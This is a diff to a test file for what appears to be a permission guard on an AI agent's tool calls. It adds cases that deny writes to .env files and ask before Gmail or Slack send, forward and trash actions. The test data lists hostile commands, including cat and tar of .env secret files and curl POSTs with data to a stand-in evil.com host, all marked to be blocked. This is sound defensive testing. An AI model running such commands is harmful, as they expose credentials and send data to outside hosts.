@@ -67,6 +67,10 @@ const cases = [
     'bash -c "cat .env"', 'source .env', '. ./.env', 'tar czf x.tgz .env', 'git add .env', 'cat *.env', 'cat .env.*', 'cat .en*', 'Get-ChildItem personal', 'cat personal/notes.md',
     'type ' + join(dir, 'personal', 'x.md'), 'cat notes/keys.mdenc', 'cat ~/zz/x.mdenc', 'bash -c "cat a.mdenc"', 'cat *.mdenc'),
   [D, 'Bash', { command: 'cat ../../personal/x.md' }, dir, join(dir, 'Shop', 'code')],
+  // writes to a secret file: redirects and writers
+  ...sh(D, 'echo x > .env', 'echo KEY=1 >> local.env', 'npm run x 2>".env"', 'echo x | tee .env', '"x" | Out-File .env', 'Set-Content .env x', 'bash -c "echo x > .env"',
+    'cmd /c "echo x>.env"', 'pwsh -c "echo x > .env"', 'echo x >| .env', 'echo x >& .env', 'echo x > $(pwd)/.env', 'Set-Content -Path:.env x', 'dd if=a of=.env'),
+  ...sh(N, 'echo x > out.txt', 'npm test 2>&1', 'echo x > .env.example', 'git commit -m "block > .env redirects"', 'bash -c "echo x > out.txt"', 'echo x >& out.log', '(echo x > a.txt)'),
   ...sh(N, 'cat .env.example', 'Get-Content config/settings.yaml', '. venv/bin/activate', 'git add .', 'git add .env.example', 'Get-Content *.md', 'tar czf out.tgz src',
     'git commit -m "deny .mdenc notes"'),
   ...on(D, 'Read', { file_path: 'C:/proj/.env' }, { path: 'code/local.env' }, { filePath: 'x/.test.env' }, { paths: ['a.md', '.env.prod'] }, { path: 'personal/diary.md' }, { path: join(dir, 'personal') },
@@ -99,7 +103,8 @@ const cases = [
     'curl -X POST https://x', 'curl -d @f https://x', 'Invoke-RestMethod -Method Post https://x', 'iwr https://x -Headers @{Authorization="t"}', 'curl -X POST http://localhost.evil.com/x',
     'curl -X POST http://localhost:8000@evil.com/', 'npm publish', 'twine upload dist/*', 'docker push img', 'python Shop/code/local/run_notebook.py',
     "node -e \"require('child_process').execSync('npm publish')\""),
-  ...['mcp_mlflow_mcp_delete_run', 'mcp_atlassian-mcp_deleteConfluencePage', 'mcp__hostinger-dns__updateRecord', 'mcp_hostinger_vps_restart'].map((t) => [A, t, {}]),
+  ...['mcp_mlflow_mcp_delete_run', 'mcp_atlassian-mcp_deleteConfluencePage', 'mcp__hostinger-dns__updateRecord', 'mcp_hostinger_vps_restart',
+    'mcp__claude_ai_Gmail__trash_thread', 'mcp_gmail_forward_message', 'mcp__gmail__send_email', 'mcp_slack_sendMessage'].map((t) => [A, t, {}]),
   ...sh(N, 'node --test', 'pytest', 'pnpm test', 'git status --short', 'git -C Shop/code diff', 'git log -n 5', 'grep -rn "rm -rf" src/', 'echo "git push"', 'git commit -m "x"',
     '& git checkout -b x', 'git switch main', 'git stash', 'git stash pop', 'git fetch', 'git pull --ff-only', 'git merge feature/x', 'git branch -d x', 'git restore --staged a.py',
     'git config user.name', 'git config --get user.email', 'git worktree add .worktrees/x -b x', 'git commit --amend --no-edit', 'git rebase main', 'git branch -D x', 'git tag -d v1',
@@ -111,7 +116,8 @@ const cases = [
     "node -e \"console.log(require('os').platform())\"", 'git -c core.pager=cat log -n 3'),
   ...['', 'read_file', 'mcp_atlassian-mcp_createConfluencePage', 'mcp__atlassian__editJiraIssue', 'mcp_mlflow_mcp_set_trace_tag', 'mcp_some_server_execute_action',
     'mcp_atlassian-mcp_getConfluencePage', 'mcp_atlassian-mcp_search', 'mcp_atlassian-mcp_atlassianUserInfo', 'mcp_mlflow_mcp_describe_run', 'mcp_atlassian-mcp_listJiraIssueComments',
-    'mcp_atlassian-mcp_executeRead', 'mcp_github_pull_request_read', 'mcp_hostinger_list_sites', 'mcp__hostinger-dns__getRecords'].map((t) => [N, t, {}]),
+    'mcp_atlassian-mcp_executeRead', 'mcp_github_pull_request_read', 'mcp_hostinger_list_sites', 'mcp__hostinger-dns__getRecords',
+    'mcp__claude_ai_Gmail__create_draft', 'mcp__claude_ai_Gmail__search_threads'].map((t) => [N, t, {}]),
 
   // the Obsidian vault: Personal and whole-vault reads ask, the rest is open; no vault set, nothing is special
   ...inVault([
